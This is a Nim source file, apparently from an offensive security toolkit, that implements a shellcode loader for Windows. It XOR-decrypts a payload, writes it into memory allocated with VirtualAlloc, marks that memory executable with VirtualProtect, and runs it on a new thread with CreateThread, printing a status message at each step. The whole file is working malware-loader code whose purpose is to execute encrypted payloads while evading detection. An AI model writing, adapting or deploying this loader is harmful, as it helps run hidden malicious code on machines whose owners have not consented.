import winim/lean
import ../crypto/exor/xorro

proc loadPayload(
        payload: pointer,
        payload_len: int,
        key: string) =

    echo "[*] Allocating executable memory..."

    let memPtr = VirtualAlloc(
        NULL,
        cast[SIZE_T](payload_len),
        MEM_COMMIT or MEM_RESERVE,
        PAGE_READWRITE
    )

    if memPtr == NULL:
        echo "[!] Failed to allocate memory. Error: ", GetLastError()

        return

    echo "[*] Decrypting payload"

    discard xorro(toOpenArray(
            cast[ptr UncheckedArray[byte]](payload),
            0,
            payload_len),
        key)

    echo "[*] Writing payload to memory..."

    copyMem(memPtr, payload, payload_len)

    var oldProtect: DWORD = 0

    let rv = VirtualProtect(
            memPtr,
            cast[SIZE_T](payload_len),
            PAGE_EXECUTE_READ,
            addr(oldProtect))

    if rv != 0:
        echo "[*] Creating thread..."
        let hThread = CreateThread(
            NULL,
            0,
            cast[LPTHREAD_START_ROUTINE](memPtr),
            NULL,
            0,
            NULL
        )

        # must be cast to NULL, or we get a type mismatch error!
        if hThread == cast[HANDLE](NULL):
            echo "[!] Failed to create thread. Error: ", GetLastError()

            VirtualFree(memPtr, 0, MEM_RELEASE)

            return

        echo "[+] Thread created successfully. Waiting for execution..."

        WaitForSingleObject(hThread, INFINITE)

        VirtualFree(memPtr, 0, MEM_RELEASE)

        CloseHandle(hThread)

        echo "[*] Done."
    else:
        echo "[!] Error with VirtualProtect!"

export loadPayload
